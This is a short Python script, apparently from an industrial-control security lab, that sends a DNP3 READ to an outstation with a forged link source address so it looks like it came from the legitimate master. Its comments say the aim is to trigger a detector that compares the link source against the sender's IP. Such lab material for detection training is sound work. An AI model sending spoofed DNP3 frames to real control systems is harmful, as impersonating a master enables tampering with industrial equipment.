#!/usr/bin/env python3
# Scenario: spoof — DNP3 frame with a forged link-source address.
#
# The attacker sends the outstation a single, perfectly normal READ — but with
# the link source address = 2 (the legitimate master's ID). I.e. at the DNP3
# layer it appears to come from the master; at the IP layer it comes from the
# attacker. This is the minimal demonstration of the (dnp3.dl.src ↔ orig_h)
# mismatch — it does nothing else anomalous.
#
# Signal: the link-vs-IP detector cross-references the DNP3 link source with
# the source IP against the Lab 1 baseline (link 2 == master ==
# 192.168.21.20) and flags the discrepancy.
import socket
import sys

from _dnp3 import read_request, send_frame

OUTSTATION_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.20.10"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 20000
DST_LINK = 1
SPOOFED_SRC_LINK = int(sys.argv[3]) if len(sys.argv) > 3 else 2  # legitimate master's link ID


def main():
    print(f"[spoof] Sending a READ to {OUTSTATION_IP}:{PORT} with forged DNP3 "
          f"link source {SPOOFED_SRC_LINK}")
    frame = read_request(DST_LINK, SPOOFED_SRC_LINK, group=1, variation=0, seq=0)
    reply = send_frame(OUTSTATION_IP, PORT, frame)
    print(f"[spoof]  reply: {reply.hex() if reply else 'no reply'}")
    print("[spoof] Done — on the EWS, cross-check the DNP3 link source against "
          "orig_h and the Lab 1 baseline.")


if __name__ == "__main__":
    main()
